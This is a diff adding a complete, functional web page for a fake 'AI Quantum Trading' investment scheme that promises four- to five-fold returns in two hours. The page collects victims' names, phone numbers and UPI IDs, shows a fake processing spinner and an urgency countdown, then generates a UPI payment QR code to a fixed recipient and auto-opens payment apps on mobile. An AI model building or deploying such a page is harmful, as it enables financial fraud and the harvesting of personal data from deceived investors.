@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Trading Investment | Double Your Money in 2 Hours</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f172a, #1e293b);
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            padding: 20px;
+            background: linear-gradient(135deg, #1e40af, #3b82f6);
+            border-radius: 15px;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .tagline {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+
+        .time-badge {
+            background: #f59e0b;
+            color: #1e293b;
+            padding: 8px 20px;
+            border-radius: 25px;
+            display: inline-block;
+            margin-top: 15px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .card {
+            background: #1e293b;
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid #334155;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .title {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #60a5fa;
+        }
+
+        .warning-box {
+            background: #fef3c7;
+            color: #92400e;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 20px;
+            border: 2px solid #f59e0b;
+        }
+
+        .investment-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+
+        .investment-table th {
+            background: #1e40af;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .investment-table td {
+            padding: 15px;
+            text-align: center;
+            border-bottom: 1px solid #334155;
+        }
+
+        .investment-table tr:hover {
+            background: #2d3748;
+        }
+
+        .profit-amount {
+            color: #10b981;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .slots-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .slot {
+            background: #334155;
+            border: 2px solid #475569;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .slot:hover {
+            transform: translateY(-5px);
+            border-color: #60a5fa;
+            background: #3c4a60;
+        }
+
+        .slot.selected {
+            border-color: #10b981;
+            background: #064e3b;
+        }
+
+        .slot-amount {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .slot-profit {
+            color: #10b981;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .slot-time {
+            font-size: 14px;
+            color: #94a3b8;
+            margin-bottom: 15px;
+        }
+
+        .select-btn {
+            background: #10b981;
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 25px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            font-size: 16px;
+        }
+
+        .select-btn:hover {
+            background: #059669;
+            transform: scale(1.05);
+        }
+
+        /* Payment Steps */
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .close-btn {
+            float: right;
+            background: none;
+            border: none;
+            color: #94a3b8;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 0 10px;
+        }
+
+        .close-btn:hover {
+            color: white;
+        }
+
+        .step-title {
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .step-subtitle {
+            text-align: center;
+            color: #94a3b8;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 15px;
+            background: #0f172a;
+            border: 2px solid #334155;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+        }
+
+        .form-input:focus {
+            border-color: #3b82f6;
+            outline: none;
+        }
+
+        .pay-btn {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            font-size: 18px;
+            transition: all 0.3s;
+            margin-top: 20px;
+        }
+
+        .pay-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 10px 20px rgba(16, 185, 129, 0.3);
+        }
+
+        /* Loading Animation */
+        .loading {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .spinner {
+            border: 5px solid #334155;
+            border-top: 5px solid #10b981;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* QR Code Section */
+        .qr-container {
+            text-align: center;
+        }
+
+        .qr-wrapper {
+            display: inline-block;
+            padding: 20px;
+            background: white;
+            border-radius: 15px;
+            margin: 25px 0;
+        }
+
+        .qr-code {
+            width: 250px;
+            height: 250px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            margin: 0 auto;
+        }
+
+        .timer {
+            font-size: 18px;
+            margin: 20px 0;
+            color: #fbbf24;
+            font-weight: bold;
+        }
+
+        .upi-details {
+            background: #0f172a;
+            padding: 20px;
+            border-radius: 15px;
+            margin-top: 25px;
+            border: 2px solid #334155;
+        }
+
+        .upi-label {
+            color: #94a3b8;
+            margin-bottom: 5px;
+        }
+
+        .upi-value {
+            font-size: 18px;
+            font-weight: bold;
+            color: #60a5fa;
+            margin-bottom: 15px;
+        }
+
+        .return-info {
+            background: #065f46;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 15px;
+            border: 2px solid #10b981;
+        }
+
+        .return-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #a7f3d0;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 30px 20px;
+            color: #94a3b8;
+            font-size: 14px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .footer-link {
+            color: #60a5fa;
+            text-decoration: none;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .slots-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .investment-table {
+                font-size: 14px;
+            }
+            
+            .investment-table td, 
+            .investment-table th {
+                padding: 10px;
+            }
+            
+            .qr-code {
+                width: 200px;
+                height: 200px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">💰 AI QUANTUM TRADING</div>
+            <div class="tagline">Double Your Investment in Just 2 Hours with AI Trading</div>
+            <div class="time-badge">⏱️ TIME: 2 HOURS • PROFIT REFUND GUARANTEED</div>
+        </div>
+
+        <!-- Investment Table -->
+        <div class="card">
+            <div class="title">INVESTMENT & PROFIT CHART</div>
+            <div class="warning-box">
+                ⚠️ MINIMUM 10K INVESTMENT REQUIRED • PROFIT REFUND TIME: 2 HOURS
+            </div>
+            <table class="investment-table">
+                <thead>
+                    <tr>
+                        <th>INVESTMENT</th>
+                        <th>PROFIT</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>₹10,000</td>
+                        <td class="profit-amount">₹40,000</td>
+                    </tr>
+                    <tr>
+                        <td>₹20,000</td>
+                        <td class="profit-amount">₹80,000</td>
+                    </tr>
+                    <tr>
+                        <td>₹25,000</td>
+                        <td class="profit-amount">₹1,00,000</td>
+                    </tr>
+                    <tr>
+                        <td>₹50,000</td>
+                        <td class="profit-amount">₹2,50,000</td>
+                    </tr>
+                    <tr>
+                        <td>₹1,00,000</td>
+                        <td class="profit-amount">₹5,00,000</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Slot Selection -->
+        <div class="card" id="slotSelection">
+            <div class="title">Choose Your Investment Slot</div>
+            <div class="step-subtitle">AI will trade using your selected amount</div>
+            
+            <div class="slots-grid">
+                <!-- Slot 1 -->
+                <div class="slot selected" onclick="selectSlot(this)" data-amount="10000" data-profit="40000">
+                    <div class="slot-amount">₹10,000</div>
+                    <div class="slot-profit">Get ₹40,000</div>
+                    <div class="slot-time">Only in just 2 hours</div>
+                    <button class="select-btn" onclick="showPayment()">SELECT SLOT</button>
+                </div>
+                
+                <!-- Slot 2 -->
+                <div class="slot" onclick="selectSlot(this)" data-amount="20000" data-profit="80000">
+                    <div class="slot-amount">₹20,000</div>
+                    <div class="slot-profit">Get ₹80,000</div>
+                    <div class="slot-time">Only in just 2 hours</div>
+                    <button class="select-btn" onclick="showPayment()">SELECT SLOT</button>
+                </div>
+                
+                <!-- Slot 3 -->
+                <div class="slot" onclick="selectSlot(this)" data-amount="25000" data-profit="100000">
+                    <div class="slot-amount">₹25,000</div>
+                    <div class="slot-profit">Get ₹1,00,000</div>
+                    <div class="slot-time">Only in just 2 hours</div>
+                    <button class="select-btn" onclick="showPayment()">SELECT SLOT</button>
+                </div>
+                
+                <!-- Slot 4 -->
+                <div class="slot" onclick="selectSlot(this)" data-amount="50000" data-profit="250000">
+                    <div class="slot-amount">₹50,000</div>
+                    <div class="slot-profit">Get ₹2,50,000</div>
+                    <div class="slot-time">Only in just 2 hours</div>
+                    <button class="select-btn" onclick="showPayment()">SELECT SLOT</button>
+                </div>
+                
+                <!-- Slot 5 -->
+                <div class="slot" onclick="selectSlot(this)" data-amount="100000" data-profit="500000">
+                    <div class="slot-amount">₹1,00,000</div>
+                    <div class="slot-profit">Get ₹5,00,000</div>
+                    <div class="slot-time">Only in just 2 hours</div>
+                    <button class="select-btn" onclick="showPayment()">SELECT SLOT</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Payment Steps -->
+        <div class="card" id="paymentSteps" style="display: none;">
+            <!-- Step 1: User Details -->
+            <div class="step active" id="step1">
+                <button class="close-btn" onclick="closePayment()">×</button>
+                <div class="step-title">Complete Your Purchase</div>
+                <div class="step-subtitle">Enter your details to proceed with AI Trading</div>
+                
+                <div class="form-group">
+                    <label class="form-label">Full Name</label>
+                    <input type="text" id="userName" class="form-input" placeholder="Enter your full name">
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">Mobile Number</label>
+                    <input type="tel" id="userPhone" class="form-input" placeholder="10-digit mobile number">
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">Return Amount UPI ID</label>
+                    <input type="text" id="userUPI" class="form-input" placeholder="yourname@upi OR 10-digit number">
+                    <div style="font-size: 12px; color: #94a3b8; margin-top: 5px;">
+                        We'll refund your profit to this UPI ID/number within 2 hours
+                    </div>
+                </div>
+                
+                <button class="pay-btn" onclick="proceedToPayment()">
+                    Invest ₹<span id="paymentAmount">10,000</span> • Get ₹<span id="profitAmount">40,000</span>
+                </button>
+            </div>
+
+            <!-- Step 2: Loading -->
+            <div class="step" id="step2">
+                <div class="loading">
+                    <div class="step-title">Processing Your Investment</div>
+                    <div class="spinner"></div>
+                    <p>Connecting to AI Trading System...</p>
+                    <p style="color: #94a3b8; margin-top: 10px; font-size: 14px;">
+                        Your funds are being allocated to Quantum AI Trading Algorithm
+                    </p>
+                </div>
+            </div>
+
+            <!-- Step 3: QR Code -->
+            <div class="step" id="step3">
+                <button class="close-btn" onclick="closePayment()">×</button>
+                <div class="qr-container">
+                    <div class="step-title">Scan QR to Invest</div>
+                    <div class="step-subtitle">Scan using any UPI app to complete investment</div>
+                    
+                    <div class="qr-wrapper">
+                        <div class="qr-code" id="qrCodeContainer">
+                            <!-- QR Code will appear here -->
+                        </div>
+                    </div>
+                    
+                    <div class="timer" id="timerDisplay">⏱️ Valid for: 08:00 minutes</div>
+                    
+                    <div class="upi-details">
+                        <div class="upi-label">PAYMENT UPI ID</div>
+                        <div class="upi-value">ai-quantum-trading@oksbi</div>
+                        
+                        <div class="upi-label">INVESTMENT AMOUNT</div>
+                        <div class="upi-value">₹<span id="displayAmount">10,000</span></div>
+                        
+                        <div class="upi-label">EXPECTED PROFIT</div>
+                        <div class="upi-value">₹<span id="displayProfit">40,000</span></div>
+                        
+                        <div class="return-info">
+                            <div class="return-title">📬 RETURN INFORMATION</div>
+                            <div style="font-size: 14px;">
+                                Your profit of ₹<span id="returnProfit">40,000</span> will be sent to:<br>
+                                <span id="returnUPI" style="color: #a7f3d0; font-weight: bold;">Your UPI ID/Number</span><br>
+                                within 2 hours of successful payment
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Terms & Conditions</a>
+                <a href="#" class="footer-link">Privacy Policy</a>
+                <a href="#" class="footer-link">Refund Policy</a>
+                <a href="#" class="footer-link">Contact Support</a>
+                <a href="#" class="footer-link">How AI Trading Works</a>
+            </div>
+            <p>⚠️ Investments are subject to market risks. Please read all related documents carefully.</p>
+            <p>© 2024 AI Quantum Trading Platform. All rights reserved.</p>
+        </div>
+    </div>
+
+    <script>
+        let selectedSlot = {
+            amount: '10000',
+            profit: '40000'
+        };
+        
+        let timer;
+        let timeLeft = 480; // 8 minutes
+
+        // Select Slot
+        function selectSlot(slotElement) {
+            // Remove selected class from all slots
+            document.querySelectorAll('.slot').forEach(slot => {
+                slot.classList.remove('selected');
+            });
+            
+            // Add selected class to clicked slot
+            slotElement.classList.add('selected');
+            
+            // Update selected slot data
+            selectedSlot = {
+                amount: slotElement.dataset.amount,
+                profit: slotElement.dataset.profit
+            };
+            
+            // Update payment amount display
+            updateAmountDisplay();
+        }
+
+        // Update amount display
+        function updateAmountDisplay() {
+            const amountFormatted = parseInt(selectedSlot.amount).toLocaleString('en-IN');
+            const profitFormatted = parseInt(selectedSlot.profit).toLocaleString('en-IN');
+            
+            document.getElementById('paymentAmount').textContent = amountFormatted;
+            document.getElementById('profitAmount').textContent = profitFormatted;
+            document.getElementById('displayAmount').textContent = amountFormatted;
+            document.getElementById('displayProfit').textContent = profitFormatted;
+            document.getElementById('returnProfit').textContent = profitFormatted;
+        }
+
+        // Show Payment Steps
+        function showPayment() {
+            // Hide slot selection
+            document.getElementById('slotSelection').style.display = 'none';
+            
+            // Show payment steps
+            document.getElementById('paymentSteps').style.display = 'block';
+            
+            // Update return UPI display
+            const upiInput = document.getElementById('userUPI');
+            if (upiInput.value) {
+                document.getElementById('returnUPI').textContent = upiInput.value;
+            }
+            
+            // Reset to step 1
+            showStep(1);
+        }
+
+        // Show specific step
+        function showStep(stepNumber) {
+            // Hide all steps
+            document.querySelectorAll('.step').forEach(step => {
+                step.classList.remove('active');
+            });
+            
+            // Show the requested step
+            document.getElementById(`step${stepNumber}`).classList.add('active');
+        }
+
+        // Proceed to payment
+        function proceedToPayment() {
+            const name = document.getElementById('userName').value.trim();
+            const phone = document.getElementById('userPhone').value.trim();
+            const upi = document.getElementById('userUPI').value.trim();
+            
+            // Validation
+            if (!name || name.length < 2) {
+                alert('Please enter your full name');
+                document.getElementById('userName').focus();
+                return;
+            }
+            
+            if (!phone || !/^\d{10}$/.test(phone)) {
+                alert('Please enter a valid 10-digit mobile number');
+                document.getElementById('userPhone').focus();
+                return;
+            }
+            
+            if (!upi) {
+                alert('Please enter your UPI ID or phone number for profit refund');
+                document.getElementById('userUPI').focus();
+                return;
+            }
+            
+            // Update return UPI display
+            document.getElementById('returnUPI').textContent = upi;
+            
+            // Go to loading step
+            showStep(2);
+            
+            // After 3 seconds, show QR code
+            setTimeout(() => {
+                showStep(3);
+                generateQRCode();
+                startTimer();
+            }, 3000);
+        }
+
+        // Generate QR Code
+        function generateQRCode() {
+            const upiId = "ai-quantum-trading@oksbi";
+            const name = document.getElementById('userName').value || 'Investor';
+            const amount = selectedSlot.amount;
+            
+            // Create UPI payment URL
+            const upiUrl = `upi://pay?pa=${upiId}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tn=AI%20Trading%20Investment`;
+            
+            // Generate QR code image
+            const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiUrl)}&bgcolor=ffffff&color=1e40af&margin=15`;
+            
+            // Display QR code
+            const qrContainer = document.getElementById('qrCodeContainer');
+            qrContainer.innerHTML = `<img src="${qrCodeUrl}" alt="UPI Payment QR Code" style="width: 100%; height: 100%; border-radius: 10px;">`;
+            
+            // Auto-open UPI apps on mobile devices
+            if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                setTimeout(() => {
+                    window.location.href = upiUrl;
+                }, 2000);
+            }
+        }
+
+        // Start Timer
+        function startTimer() {
+            clearInterval(timer);
+            timeLeft = 480;
+            updateTimerDisplay();
+            
+            timer = setInterval(() => {
+                timeLeft--;
+                updateTimerDisplay();
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    document.getElementById('timerDisplay').innerHTML = '⏰ Payment link expired!';
+                    document.getElementById('timerDisplay').style.color = '#ef4444';
+                }
+            }, 1000);
+        }
+
+        // Update Timer Display
+        function updateTimerDisplay() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            const timerDisplay = document.getElementById('timerDisplay');
+            
+            if (timeLeft < 60) {
+                timerDisplay.style.color = '#ef4444';
+                timerDisplay.innerHTML = `⏰ Hurry! Expires in: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            } else {
+                timerDisplay.innerHTML = `⏱️ Valid for: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')} minutes`;
+            }
+        }
+
+        // Close Payment
+        function closePayment() {
+            // Show slot selection
+            document.getElementById('slotSelection').style.display = 'block';
+            
+            // Hide payment steps
+            document.getElementById('paymentSteps').style.display = 'none';
+            
+            // Stop timer
+            clearInterval(timer);
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set initial slot
+            selectSlot(document.querySelector('.slot.selected'));
+            
+            // Add input validation
+            document.getElementById('userName').addEventListener('input', function(e) {
+                this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
+            });
+            
+            document.getElementById('userPhone').addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '').slice(0, 10);
+            });
+            
+            // Update return UPI when user types
+            document.getElementById('userUPI').addEventListener('input', function(e) {
+                document.getElementById('returnUPI').textContent = this.value || 'Your UPI ID/Number';
+            });
+        });
+    </script>
+</body>
+</html>
